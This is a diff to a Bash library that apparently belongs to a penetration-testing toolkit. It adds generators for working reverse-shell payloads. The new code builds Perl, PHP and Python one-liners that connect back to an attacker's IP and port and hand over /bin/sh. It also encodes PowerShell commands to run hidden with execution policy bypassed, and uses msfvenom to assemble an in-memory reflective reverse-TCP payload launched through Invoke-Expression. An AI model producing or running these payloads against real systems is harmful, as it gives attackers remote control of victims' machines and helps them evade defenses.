@@ -22,21 +22,41 @@ get_bash_reverse_shell() {
     if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
-    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then        
-        reverse_shell="bash -c \"$reverse_shell\""        
-
+    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
+        reverse_shell="bash -c \"$reverse_shell\""
     fi
     echo "$reverse_shell"
 }
 
+get_perl_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell=''\''use Socket;$i="'"$host_ip"'";$p='"$host_port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''
+    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
+        echo "$reverse_shell"
+    else
+        reverse_shell="perl -e $reverse_shell"
+        echo "$reverse_shell"
+    fi
+}
 get_python_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+    local python_exe=""
+    if [[ -z $python_version ]]; then
+        python_exe="python3"
+    elif [[ $python_version == "2" ]]; then
+        python_exe="python"
+    elif [[ $python_version == "3" ]]; then
+        python_exe="python3"
+    else
+        python_exe="python3"
+    fi
+
     if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
         #reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
-        reverse_shell="{\"python3\", \"-c\" , \"$reverse_shell\"}"
+        reverse_shell="{\"$python_exe\", \"-c\" , \"$reverse_shell\"}"
     elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
-        reverse_shell="python3 -c '$reverse_shell'"
+        reverse_shell="$python_exe -c '$reverse_shell'"
 
     fi
     echo "$reverse_shell"
@@ -60,15 +80,42 @@ get_busybox_reverse_shell() {
     echo "$reverse_shell"
 }
 
+get_php_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);"
+    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
+        echo "$reverse_shell"
+    else
+        reverse_shell="php -r '$reverse_shell'"
+        echo "$reverse_shell"
+    fi
+}
+
 encode_powershell() {
     if [ -z "$1" ]; then
         echo "Usage: powershell_base64 <string>"
         return 1
     fi
     local input_string="$1"
-    local encoded_string=$(echo "$input_string" | iconv -t UTF-16LE | base64 | tr -d '\n')
-    echo "powershell -ep bypass -nop -nol -noni -ec $encoded_string"
+    if [[ "$input_string" == "powershell"* ]]; then
+        # Assume already encoded
+        echo "$input_string"
+        return 0
+    fi
+    local encoded_string=""
+    encoded_string=$(echo "$input_string" | iconv -t UTF-16LE | base64 | tr -d '\n')
+    if [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "simple" ]]; then
+        echo "powershell -ec $encoded_string"
+    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "short" ]]; then
+        echo "$encoded_string"
+    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "long" ]]; then
+        encoded_string=$(echo "$input_string" | base64 | tr -d '\n')
+        echo "powershell -Command \"\$Bytes=[System.Convert]::FromBase64String('$encoded_string');\$DecodedCommand=[System.Text.Encoding]::UTF8.GetString(\$Bytes);Invoke-Expression \$DecodedCommand\""
+    else
+        echo "powershell -ep bypass -w hidden -nop -nol -noni -ec $encoded_string"
+    fi
 }
+
 
 get_powershell_reverse_shell() {    
     if [ ! -z "$1" ]; then
@@ -178,7 +225,9 @@ get_powershell_interactive_shell() {
         reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$\{additional_commands\}/'$powershell_additional_commands'/g')
     fi
     if [[ ! -z $background_shell ]] && [[ "$background_shell" == "false" ]]; then
-        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$background = \$true/\$background = \$false/g')
+        reverse_shell=$(echo "$reverse_shell" | sed -E '/Start-Process/d')
+    else
+        reverse_shell=$(echo "$reverse_shell" | sed -E '/\. \.\\/d')
     fi
     if [ "$encode_shell" == "false" ]; then
         echo "$reverse_shell"
@@ -244,6 +293,23 @@ get_nc_reverse_shell_powershell() {
 
 }
 
+get_powershell_in_memory_shell() {
+
+    if [[ -z $host_port ]]; then
+        host_port=4444  # Default reverse shell port
+    fi
+    if [[ -z $host_ip ]]; then
+        host_ip=$(get_host_ip)
+    fi
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$host_ip LPORT=$host_port -f psh-reflection -o payload.ps1 >> $trail_log
+    cp $SCRIPTDIR/../ps1/reverse_shell_in_memory.ps1 .
+    cat payload.ps1 >> reverse_shell_in_memory.ps1
+    rm payload.ps1
+    local cmd=$(cat reverse_shell_in_memory.ps1)
+    encoding_type="long"    
+    cmd=$(encode_powershell "$cmd")
+    echo "$cmd"
+}
 
 start_listener() {
     if [ -z "$host_port" ]; then
@@ -323,7 +389,27 @@ get_listener_command() {
     if [[ ! -z "$2" ]]; then
         interactive=$2
     fi
+    if [[ -z $host_ip ]]; then
+        host_ip=$(get_host_ip)
+    fi
     echo $COMMONDIR/start_listener.sh "$project" "$host_port" "$interactive"
+}
+
+is_listener_connected() {
+    local target_ip=""
+    if [[ -z $1 ]]; then
+        echo "The target_ip not specified, using the default $ip"        
+        target_ip=$ip
+    else
+        target_ip=$1
+    fi
+    if ss -tpn | grep "$host_port.*$target_ip"; then
+        echo "Listener is connected to $target_ip on port $host_port."
+        return 0
+    else
+        echo "Listener is not connected to $target_ip on port $host_port."
+        return 1
+    fi
 }
 
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
